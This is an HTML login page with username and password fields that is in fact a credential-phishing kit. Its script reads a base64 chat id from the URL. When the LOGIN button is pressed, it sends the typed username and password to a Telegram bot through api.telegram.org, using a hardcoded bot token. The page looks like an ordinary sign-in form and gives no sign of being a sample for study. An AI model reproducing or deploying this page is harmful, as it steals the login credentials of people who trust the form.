<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        input{
            display: block;
            margin: auto;
            width:240px;
            height:40px;
            border-radius:3px;
        }
        button{
            display: block;
            margin: auto;
            width:200px;
            height:30px;
        }
    </style>
</head>
<body>
    <div style="margin-top:250px;">
        <input type="text" id="username" placeholder="Username"><br>
        <input type="password" id="password" placeholder="Password"><br>
        <button onclick="login()">LOGIN</button>
    </div>
</body>

</html>
<script>
      
      var desire = atob(location.search.slice(1).split("&")[0].split("=")[1]);
      function login(){
        var username=document.getElementById('username').value;
        var password=document.getElementById('password').value;
        var message=`Username:[${username}] %0A Password:[${password}]`;
        fetch(`https://api.telegram.org/bot1920440271:AAGQ3sv8UkLga66ruEuCwEdlvhIbkkj9dwo/sendMessage?chat_id=${desire}&text=`+message);
      }
</script>
